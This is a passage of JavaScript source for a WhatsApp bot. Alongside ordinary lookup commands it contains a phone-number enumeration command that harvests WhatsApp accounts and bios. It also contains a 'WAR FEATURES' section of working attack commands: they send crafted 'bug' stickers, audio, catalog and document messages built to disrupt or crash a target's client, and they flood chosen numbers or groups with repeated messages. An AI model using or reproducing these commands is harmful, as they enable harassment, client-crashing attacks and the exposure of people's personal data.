mediaUrl: 'https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg',
sourceUrl: "https://telegra.ph/file/e6259010eb14f0e5fb98d.jpg"
}}
}
ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
}
            break
                        
case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return m.reply(textquotes)
break
case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'رستر':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
ElgazarBot.groupRevokeInvite(m.chat)
}
break
case 'imdb':
if (!text) return m.reply(`_Name a Series or movie`)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           ElgazarBot.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
case 'weather':
if (!text) return m.reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           ElgazarBot.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           break
case 'horoscope':
if (!text) return m.reply('What sign?')
            try {
                const URL = `https://aztro.sameerkumar.website/?sign=${text}&day=today`
                fetch(URL, {
                        method: 'POST'
                    })
                    .then(response => response.json())
                    .then(json => {
                        const date = json.current_date
                        console.log(date)
                        let textw = ""
                        textw += `*👁️ Horoscope of  ${text}*\n\n`
                        textw += `*Current Date:* ${json.current_date}.\n`
                        textw += `*Sign:* ${text}.\n`
                        textw += `*Lucky Time:* ${json.lucky_time}.\n`
                        textw += `*Compatibility:* ${json.compatibility}.\n`
                        textw += `*Lucky Number:* ${json.lucky_number}.\n`
                        textw += `*Lucky Color:* ${json.color}.\n`
                        textw += `*Today Mood:* ${json.mood}.\n`
                        textw += `*Overall:* ${json.description}.\n`
                        m.reply(textw)
                    })

            } catch (e) {
                console.log(e)
            }
        break
case 'خمن': case 'تخمين': case 'searchnumber':
var inputnumber = text.split(" ")[0]
        if (!inputnumber.includes('x')) return m.reply(`اكتب الامر مثال: ${prefix + command} 201098906xxx`)
        m.reply(`البحث عن حساب واتساب في نطاق معين...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==『 قائمة أرقام واتساب 』==*\n\n`
        var nobio = `\n*البايو:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*الارقام with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await ElgazarBot.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await ElgazarBot.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *الرقم:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*البايو :* ${anu1.status}\n🧐*اخر تحديث في :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        m.reply(`${text66}${nobio}${nowhatsapp}`)
break
    

//----------------☣️WAR FEATURES☣️---------------\\
//Note: if you edit, features wont work!!!⚠️
case 'pcbut':
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
                    if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcbut 91xxxxxxxxxx`)
                 buttonvirus = [
                          {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1},
  {buttonId: 'xeon', buttonText: {displayText: xeonbutton}, type: 1},
  {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1}
]
                    buttonMsgX = {
                          text: author,
                          footerText: botname,
                          buttons: buttonvirus,
                          headerType: 1
                      }
                      ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, buttonMsgX)
                      reply(mess.success)
                    break
case 'pcstick':{
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcstick 91xxxxxxxxxx`)
xeonOP = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xeonsteker = fs.readFileSync('./XBug/xstick.webp')
ElgazarBot.sendImageAsSticker(`${text}@s.whatsapp.net`, xeonsteker, xeonOP, { packname: global.packname, author: global.author })
await reply(`Successfully bug sticker attacked ${text}@s.whatsapp.net`)
}
break
case 'pcvn':{
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcvn 91xxxxxxxxxx`)
xeonvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xaudio = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
 ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {audio: xaudio, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonvn})
await reply(`Successfully Bug Attacked The Number ${text}@s.whatsapp.net`)
}
break
case 'catalogbugxxx': {
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
const xeontalog = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
var xeonmess = await prepareWAMessageMedia({ image: xpicvirus }, { upload: ElgazarBot.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": xeonmess.imageMessage,
"productId": "99999999999999",
"title": `Xeon Ezy☣️ ${xeonbutton} ${xeonbutton}`,
"description": `Xeon Ezy☣️ ${xeonbutton} ${xeonbutton}`,
"currencyCode": "INR",
"footerText": botname,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": author,
"url": websitex
},
"businessOwnerJid": "916909137213@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: xeontalog })
ElgazarBot.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
	case 'vnbug':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
xeonyvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": botname, 
                "jpegThumbnail": xpicvirus
            } 
        } 
    }
 xeonyaud = fs.readFileSync('./XBug/fullChudaiBaazi.mp3')
 ElgazarBot.sendMessage(m.chat, {audio: xeonyaud, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonyvn})
 }
 }
break
	case 'docbug':{
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (args.length == 0) return reply(`Use ${prefix+command} amount\nExample: ${prefix+command} 3`)
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
ElgazarBot.sendMessage(m.chat, {document: xpicvirus},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Xeon Ezy☣️${xeonbrutal(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
	}
}
}})
}
}
break
case 'pcslow': { 
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcmass 91xxxxxxxxxx`)
             xeonyh1 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:xeonyh1})
            await sleep(30000)
            }
            break
case 'pcgcslow': {          
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx`)
             pmgcmassxeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
            await sleep(30000)
            }
            break
         case 'gcslow':               
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
             gcmassxeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
            await sleep(30000)
            reply(mess.success)
            break
                    case 'gcfast':               
            	
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (!m.isGroup) return m.reply(mess.group)
             gcinfinitexeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            await ElgazarBot.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
            break
case 'pcfast':               
           	
                if (!isCreator) return m.reply(`${mess.owner}`)
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxxxx`)
             pcinfinitexeon = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
            await ElgazarBot.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
